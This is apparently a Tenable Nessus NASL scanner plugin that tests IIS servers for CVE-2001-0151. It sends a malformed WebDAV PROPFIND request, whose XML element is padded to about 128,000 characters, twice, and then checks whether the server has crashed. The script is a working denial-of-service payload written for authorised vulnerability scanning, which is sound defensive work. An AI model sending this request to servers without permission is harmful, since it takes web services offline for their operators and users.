#
# (C) Tenable Network Security, Inc.
#

# This security check is heavily based on Georgi Guninski's post
# on the bugtraq mailing list


include("compat.inc");

if(description)
{
 script_id(10631);
 script_version ("$Revision: 1.26 $");
 script_cve_id("CVE-2001-0151");
 script_bugtraq_id(2453);
 script_xref(name:"OSVDB", value:"1770");

 script_name(english: "Microsoft IIS WebDAV Malformed PROPFIND Request Remote DoS");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It was possible to disable the remote IIS server
by making a specially formed PROPFIND request." );
 script_set_attribute(attribute:"solution", value:
"Disable the WebDAV extensions, as well as the PROPFIND method." );
 script_set_attribute(attribute:"see_also", value:"http://www.microsoft.com/technet/security/bulletin/MS01-016.mspx" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 script_summary(english: "Performs a denial of service against IIS");
 script_category(ACT_DENIAL);
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_family(english: "Web Servers");
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function dos(port)
{
 local_var	xml, r;

 xml = 	'<?xml version="1.0"?><a:propfind xmlns:a="DAV:" xmlns:u="over:"><a:prop><a:displayname /><u:' + crap(128008)	+ ' /></a:prop></a:propfind>\r\n';

 r = http_send_recv3(port: port, item: '/', method: 'PROPFIND', data: xml,
   add_headers: make_array('Content-Type', 'text/xml') );	
}

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);

banner = get_http_banner(port:port);
if ("Microsoft-IIS" >!< banner ) exit(0);

for (i = 1; i <= 2; i ++)
{
 dos(port:port);
 sleep(i);
}

if (http_is_dead(port: port, retry: 3)) security_hole(port);
